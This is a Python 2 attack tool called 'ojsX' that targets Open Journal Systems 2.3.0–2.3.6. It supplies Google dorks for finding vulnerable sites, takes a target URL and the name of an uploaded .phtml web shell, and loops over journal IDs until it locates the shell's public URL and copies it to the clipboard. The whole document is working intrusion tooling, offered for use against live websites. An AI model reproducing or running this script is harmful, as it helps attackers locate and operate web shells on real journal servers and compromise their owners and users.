#!/usr/bin/python2.7

from colorama import *
import requests
import pyperclip
import os
from time import sleep

init()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

temp = "{}[{}] {}{}"

def warning(text):
        print temp.format(Fore.YELLOW+Style.BRIGHT,"!",Style.RESET_ALL,text)

def info(text):
    print temp.format(Fore.BLUE + Style.BRIGHT, "-", Style.RESET_ALL, text)

def success(text):
    print temp.format(Fore.GREEN + Style.BRIGHT, "+", Style.RESET_ALL, text)

def error(text):
    print temp.format(Fore.RED + Style.BRIGHT, "!", Style.RESET_ALL, text)

def ascii():
    art = \
    """{}     _ _  _ _ _ _ _ _ _ {}_    _{}
   /     \ _   _/     /  {}\ /  /{}
  |   -   |_|  |   - / {}-  ^   -{}
   \ _ _ /_ _ _|_ _ / {}/_ / \ _\\{}
    """.format(Fore.CYAN+Style.BRIGHT,Fore.RED,Fore.CYAN,Fore.RED,Fore.CYAN,Fore.RED,Fore.CYAN,Fore.RED,Fore.CYAN)
    print(art)

def banner():
    ascii()
    print " {}ojsX  {}'a simple OJS eXploiter'".format(Fore.CYAN+Style.BRIGHT,Style.RESET_ALL)
    print " %sv%s by Dytra%s\n" % (Style.DIM,version,Style.RESET_ALL)
version = "1.0"

clear()
banner()
success("All modules have been loaded")
info("Dork : inurl:/index.php/index/user/register")
print "    	   inurl:/author/submit/1"
warning("This exploit {}ONLY{} works on OJS version 2.3.0-2.3.6".format(Style.BRIGHT,Style.RESET_ALL))
warning("You {}MUST{} upload the submission file to the site in order to make this exploit works".format(Style.BRIGHT,Style.RESET_ALL))
print ""
info("The full url of the ojs vulnerable website.")
info("Ex : http://www.vulnjs.com")
url  = raw_input("    URL      : ")
info("The name of your phtml file that you've uploaded (Ex : 1-1-1-SM.phtml)")
filename = raw_input("    Filename : ")
article_id = filename.split("-")[0]
journal_id = 1
clear()
print ""
banner()
info("Starting Exploitation...\n")
while(True):
    info("Trying to exploit " + str(journal_id))
    full_url = url + "/files/journals/"+ str(journal_id) +"/articles/"+ article_id +"/submission/original/" + filename
    try:
        r = requests.get(full_url)
    except:
        error("Can't connect to the host. It seems you have a bad connection :(")
        info("Retrying to connect...(Hit CTRL-C to stop)\n")
        sleep(3)
        continue
    if(r.status_code == 200):
        pyperclip.copy(full_url)
        success("Exploitation success!")
        print ""
        success("Full shell URL : " + full_url)
        success("Shell URL is copied to clipboard")
        raw_input()
        exit()
    elif(r.status_code == 500 | r.status_code == 503 | r.status_code == 301 | r.status_code == 302):
        error("Sorry ,The website isn't vurnerable :(")
        raw_input()

    if(journal_id % 50 == 0):
        q = raw_input("{}[!]{} It seems the website isn't vulnerable. Do you want to keep searching ? (y/n)".format(Fore.RED,Style.RESET_ALL))
        if(q == "n"):
            print "Goodbye!"
            exit()
    else:
        error("Can't find the right path :( Retrying...\n")

    journal_id = journal_id + 1

